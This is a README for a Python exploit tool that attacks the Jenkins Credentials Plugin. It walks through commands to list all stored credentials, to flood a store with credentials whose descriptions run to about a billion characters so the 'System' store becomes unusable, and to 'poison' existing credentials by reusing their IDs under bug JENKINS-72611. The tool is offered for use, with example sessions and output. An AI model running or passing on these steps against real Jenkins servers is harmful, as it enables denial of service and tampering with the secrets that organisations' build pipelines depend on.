# Jenkins Credentials Flood

## Description
This software takes advantage of two bugs in the Jenkins Credentials Plugin. It allows users to interact with credentials in Jenkins by exploiting two bugs. One of them (duplicate IDs) is only affecting versions prior to `1337.v60b_d7b_c7b_c9f`. 

### Bugs
1. **JENKINS-72611**: A bug affecting the Credentials Plugin prior to version `1337.v60b_d7b_c7b_c9f`. More details can be found [here](https://issues.jenkins.io/browse/JENKINS-72611).
2. **Description Length Limit**: A second bug that remains unresolved, which allows for credentials to be added without validation on the description length limit.

## Installation
To use this tool, ensure you have Python installed on your machine. Clone the repository and install any required dependencies.

```bash
git clone https://github.com/Harckade/jenkins-credentials-flood.git
cd jenkins-credentials-flood
pip install -r requirements.txt
```

## Usage
To run the program, use the following command:

```bash
python jenkins_exploit_tool.py [COMMAND] [OPTIONS]
Available Commands
help - Show this help message.
list - List all credentials from all stores.
list STORE_PATH - List credentials from a specific store. E.g., list store/sub-store.
add - Add a credential or a set of credentials to a specific store with any length. This may slow down users' browsers.
poison - Add credentials with the same ID as already existing ones. This is only possible if the Credentials plugin version is prior to 1337.v60b_d7b_c7b_c9f.
exit - Exit the program.
```

## Examples

### To run the tool using username and password
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -u admin -p s#cr3tw0rd.
```

### To run the tool using session ID token
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -t JSESSIONID.3ca79i9ds3457ergg
```

### To display the help message
```bash
python jenkins_exploit_tool.py -h
```

### To list all credentials from all stores:
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -u admin -p s#cr3tw0rd.
list
```

### To list credentials from a specific store:
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -u admin -p s#cr3tw0rd.
list store/sub-store
```

### To add a credential:
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -u admin -p s#cr3tw0rd.
add
# (default - "System") store:
# (default - "(global)") domain:
# (default - 99999999) description length: 9999999900
⚠️  1000000900 characters long description will make 'system' store unusable for the most clients ⚠️
# (y/n) procceed: y
Length: 1000000900
# (default - 1) number of credentials: 3
This may take a while...
Adding credential #creds-flood-bf622-0
```

### To poison an existing credential:
```bash
python jenkins_exploit_tool.py -l https://localhost:8080 -u admin -p s#cr3tw0rd.
poison
# (default - "System") store:
# (default - "(global)") domain:
# target credential id: harckade-1
```

## Contributing
If you'd like to contribute to this project, please follow these steps:

- Fork the repository.
- Create a new branch (git checkout -b feature-branch).
- Make your changes and commit them (git commit -m 'Add new feature').
- Push to the branch (git push origin feature-branch).
- Open a pull request.
